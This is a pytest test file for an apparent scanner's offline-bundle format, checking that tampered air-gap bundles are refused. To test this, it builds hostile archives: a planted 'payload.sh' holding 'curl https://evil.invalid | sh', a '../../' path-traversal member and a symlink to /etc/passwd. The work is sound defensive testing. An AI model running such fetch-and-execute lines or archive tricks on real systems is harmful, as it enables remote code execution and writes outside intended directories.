"""Moving a release across an air gap.

An air-gapped site cannot `pip install`, and the usual answer -- somebody
downloads a wheel onto a laptop and carries it in -- is the exact shape of the
attack this tool detects in other people's pipelines: the artefact is
unverified, the person carrying it cannot check it, and the failure is silent.

A bundle makes that transfer checkable. Every test below is an attempt to get a
modified bundle installed, because that is the only threat the format exists to
address, and because verification that has never been attacked is verification
nobody knows works.

One thing is deliberately *not* claimed. The manifest proves the bundle is the
one its own manifest describes; it cannot prove who made it, since anybody who
rewrites a file can rewrite the manifest in the same pass. Authenticity comes
from the detached signature, and `verify` says so rather than reporting a
success that means less than it sounds like.
"""

from __future__ import annotations

import io
import subprocess
import sys
import tarfile
from pathlib import Path

import pytest

from cordon_scanner.core.bundle import MANIFEST_NAME, Bundle


@pytest.fixture
def source(tmp_path: Path) -> Path:
    root = tmp_path / "payload"
    (root / "rulepacks").mkdir(parents=True)
    (root / "wheel.whl").write_bytes(b"pretend wheel")
    (root / "sbom.cdx.json").write_text('{"bomFormat":"CycloneDX"}', encoding="utf-8")
    (root / "rulepacks" / "pack.yaml").write_text("pack:\n  id: x\n", encoding="utf-8")
    return root


@pytest.fixture
def bundle(tmp_path: Path, source: Path) -> Path:
    files = [(str(p.relative_to(source)), p) for p in sorted(source.rglob("*")) if p.is_file()]
    return Bundle.create(tmp_path / "offline.tar.gz", files=files)


def rebuild(original: Path, target: Path, mutate) -> Path:
    with tarfile.open(original, "r:gz") as src, tarfile.open(target, "w:gz") as dst:
        mutate(src, dst)
    return target


def copy_all(src: tarfile.TarFile, dst: tarfile.TarFile, *, skip: str = "") -> None:
    for member in src:
        if not member.isfile() or member.name == skip:
            continue
        data = src.extractfile(member)
        assert data is not None
        dst.addfile(member, io.BytesIO(data.read()))


class TestACleanBundle:
    def test_it_verifies(self, bundle: Path) -> None:
        report = Bundle.verify(bundle)
        assert report.ok, report.problems
        assert report.checked == 3

    def test_it_installs(self, bundle: Path, tmp_path: Path) -> None:
        report = Bundle.install(bundle, tmp_path / "into")
        assert report.ok
        assert (tmp_path / "into" / "wheel.whl").read_bytes() == b"pretend wheel"
        assert (tmp_path / "into" / "rulepacks" / "pack.yaml").is_file()

    def test_the_manifest_is_checkable_without_this_tool(self, bundle: Path) -> None:
        """An operator who distrusts the bundle should not have to run the
        program inside it to decide whether to trust it."""
        with tarfile.open(bundle, "r:gz") as archive:
            handle = archive.extractfile(MANIFEST_NAME)
            assert handle is not None
            text = handle.read().decode("utf-8")
        assert "sha256sum -c" in text
        for line in text.splitlines():
            if line.startswith("#") or not line.strip():
                continue
            digest, _, name = line.partition("  ")
            assert len(digest) == 64 and name

    def test_it_says_what_it_did_not_prove(self, bundle: Path) -> None:
        """Reporting "verified" for an unsigned bundle would overstate it."""
        report = Bundle.verify(bundle)
        assert not report.signed
        assert "not who produced it" in report.summary()


class TestEveryTamperIsRefused:
    def test_a_modified_file(self, bundle: Path, tmp_path: Path) -> None:
        def mutate(src: tarfile.TarFile, dst: tarfile.TarFile) -> None:
            for member in src:
                if not member.isfile():
                    continue
                handle = src.extractfile(member)
                assert handle is not None
                data = handle.read()
                if member.name.endswith("pack.yaml"):
                    data += b"\n# injected\n"
                    member.size = len(data)
                dst.addfile(member, io.BytesIO(data))

        report = Bundle.verify(rebuild(bundle, tmp_path / "t.tar.gz", mutate))
        assert not report.ok
        assert any("digest mismatch" in p for p in report.problems)

    def test_an_added_file(self, bundle: Path, tmp_path: Path) -> None:
        """An unlisted file is one nobody checked, and install would write it to
        disk beside the checked ones."""

        def mutate(src: tarfile.TarFile, dst: tarfile.TarFile) -> None:
            copy_all(src, dst)
            info = tarfile.TarInfo("payload.sh")
            body = b"curl https://evil.invalid | sh\n"
            info.size = len(body)
            dst.addfile(info, io.BytesIO(body))

        report = Bundle.verify(rebuild(bundle, tmp_path / "t.tar.gz", mutate))
        assert not report.ok
        assert report.unlisted == ("payload.sh",)

    def test_a_removed_file(self, bundle: Path, tmp_path: Path) -> None:
        report = Bundle.verify(
            rebuild(bundle, tmp_path / "t.tar.gz", lambda s, d: copy_all(s, d, skip="wheel.whl"))
        )
        assert not report.ok
        assert report.missing == ("wheel.whl",)

    def test_a_removed_manifest(self, bundle: Path, tmp_path: Path) -> None:
        """Deleting the manifest must not read as "nothing to check"."""
        report = Bundle.verify(
            rebuild(bundle, tmp_path / "t.tar.gz", lambda s, d: copy_all(s, d, skip=MANIFEST_NAME))
        )
        assert not report.ok
        assert any("nothing in this bundle can be checked" in p for p in report.problems)

    def test_a_traversal_member(self, bundle: Path, tmp_path: Path) -> None:
        """The classic tar attack: a member that writes outside the target."""

        def mutate(src: tarfile.TarFile, dst: tarfile.TarFile) -> None:
            copy_all(src, dst)
            info = tarfile.TarInfo("../../escaped.txt")
            body = b"escaped\n"
            info.size = len(body)
            dst.addfile(info, io.BytesIO(body))

        report = Bundle.verify(rebuild(bundle, tmp_path / "t.tar.gz", mutate))
        assert not report.ok
        assert any("unsafe member name" in p for p in report.problems)

    def test_a_symlink_member(self, bundle: Path, tmp_path: Path) -> None:
        """A link is a way to write outside the target at extraction time."""

        def mutate(src: tarfile.TarFile, dst: tarfile.TarFile) -> None:
            copy_all(src, dst)
            info = tarfile.TarInfo("link")
            info.type = tarfile.SYMTYPE
            info.linkname = "/etc/passwd"
            dst.addfile(info)

        report = Bundle.verify(rebuild(bundle, tmp_path / "t.tar.gz", mutate))
        assert not report.ok
        assert any("link" in p for p in report.problems)


class TestInstallVerifiesFirst:
    def test_a_refused_bundle_writes_nothing(self, bundle: Path, tmp_path: Path) -> None:
        """Extracting and then checking would put an unverified file on disk --
        on a machine where somebody is about to run what was extracted."""

        def mutate(src: tarfile.TarFile, dst: tarfile.TarFile) -> None:
            copy_all(src, dst)
            info = tarfile.TarInfo("payload.sh")
            body = b"x\n"
            info.size = len(body)
            dst.addfile(info, io.BytesIO(body))

        bad = rebuild(bundle, tmp_path / "t.tar.gz", mutate)
        into = tmp_path / "into"
        report = Bundle.install(bad, into)
        assert not report.ok
        assert not into.exists(), "a refused bundle left files behind"

    def test_the_cli_refuses_and_says_why(self, bundle: Path, tmp_path: Path) -> None:
        def mutate(src: tarfile.TarFile, dst: tarfile.TarFile) -> None:
            copy_all(src, dst, skip="wheel.whl")

        bad = rebuild(bundle, tmp_path / "t.tar.gz", mutate)
        result = subprocess.run(
            [
                sys.executable,
                "-m",
                "cordon_scanner",
                "bundle",
                "install",
                str(bad),
                "--into",
                str(tmp_path / "into"),
            ],
            capture_output=True,
            text=True,
            check=False,
        )
        assert result.returncode == 3
        assert "REFUSED" in result.stderr
        assert "wheel.whl" in result.stderr
        assert not (tmp_path / "into").exists()


class TestCreate:
    def test_an_empty_bundle_is_refused(self, tmp_path: Path) -> None:
        """It would verify successfully and contain nothing, which is the worst
        combination: a green check over an empty transfer."""
        from cordon_scanner.core.errors import ConfigError

        with pytest.raises(ConfigError, match="no files"):
            Bundle.create(tmp_path / "empty.tar.gz", files=[])

    def test_the_manifest_describes_what_was_written(self, bundle: Path) -> None:
        """Generated from what went in, not from what was meant to."""
        with tarfile.open(bundle, "r:gz") as archive:
            names = {m.name for m in archive if m.isfile()}
            handle = archive.extractfile(MANIFEST_NAME)
            assert handle is not None
            listed = set(Bundle.parse_manifest(handle.read().decode("utf-8")))
        assert listed == names - {MANIFEST_NAME}
